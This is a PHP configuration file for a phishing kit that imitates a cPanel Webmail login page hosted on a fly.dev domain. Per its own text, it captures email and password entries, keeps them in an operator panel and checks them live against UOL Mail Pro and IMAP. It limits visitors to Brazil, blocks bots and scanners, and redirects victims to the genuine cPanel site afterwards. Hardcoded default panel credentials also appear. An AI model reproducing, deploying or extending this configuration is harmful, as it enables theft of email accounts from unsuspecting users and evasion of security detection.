<?php
declare(strict_types=1);

/**
 * Produção Fly.io — webmail-cpanel.fly.dev
 */
require_once __DIR__ . '/includes/admin_auth.php';

$panel_user = (string) (getenv('PANEL_USER') ?: 'Danadinho');
$panel_pass = (string) (getenv('PANEL_PASS') ?: 'Danado2027');
$dataDir    = rtrim((string) (getenv('PROVIDER_DATA_DIR') ?: '/data'), '/');
$baseUrl    = rtrim((string) (getenv('APP_BASE_URL') ?: 'https://webmail-cpanel.fly.dev'), '/');
$panelUrl   = $baseUrl . '/panel/';

return [
    'site_title'        => 'Login Webmail',
    'panel_name'        => (string) (getenv('PANEL_NAME') ?: 'cPanel Webmail'),
    'panel_marquee'     => 'Webmail cPanel — logins validados via API UOL Mail Pro (mailpro.uol.com.br). E-mail e senha ficam no painel.',
    'default_locale'    => 'pt_br',
    'cpanel_official_url' => 'https://webmail.cpanel.net/',
    'success_redirect'  => 'https://webmail.cpanel.net/',
    'blocked_redirect'  => 'https://webmail.cpanel.net/',
    'max_ip_visits'     => 4,
    'env'               => 'production',
    'base_url'          => $baseUrl,
    'imap_verify'       => true,
    'uol_mailpro_verify' => true,
    'uol_mailpro_auth_url' => 'https://email.uolhost.com.br/auth',
    'uol_mailpro_redir_url' => 'mailpro.uol.com.br/',
    'uol_mailpro_timeout' => 30,
    'webmail_imap_fallback' => true,
    'api_verify_path'   => 'api/verify.php',
    'session_save_path'     => $dataDir . '/sessions',

    'anti_bot' => [
        'enabled'               => true,
        'allowed_countries'     => ['BR'],
        'enforce_country'       => true,
        'deny_hosting'          => false,
        'deny_proxy_vpn'        => false,
        'deny_datacenter_asn'   => false,
        'deny_bots_ua'          => true,
        'deny_bad_headers'      => false,
        'deny_empty_ua'         => true,
        'deny_headless_signals' => false,
        'enforce_device'        => false,
        'strict_geo_unknown'    => false,
        'allow_localhost'       => false,
        'redirect'              => null,
        'log_blocks'            => true,
    ],

    'cpanel_id_url'   => '#',
    'privacy_url'     => 'https://go.cpanel.net/privacy',
    'login_action'    => '/login.php',
    'data_dir'        => $dataDir,
    'panel_user'      => $panel_user,
    'panel_pass'      => $panel_pass,
    'panel_reset_key' => (string) (getenv('PANEL_RESET_KEY') ?: 'fly-reset-change-me'),
    'two_step_login'  => false,

    'admin' => admin_auth_load($dataDir, [
        'panel_user' => $panel_user,
        'panel_pass' => $panel_pass,
    ]),
];
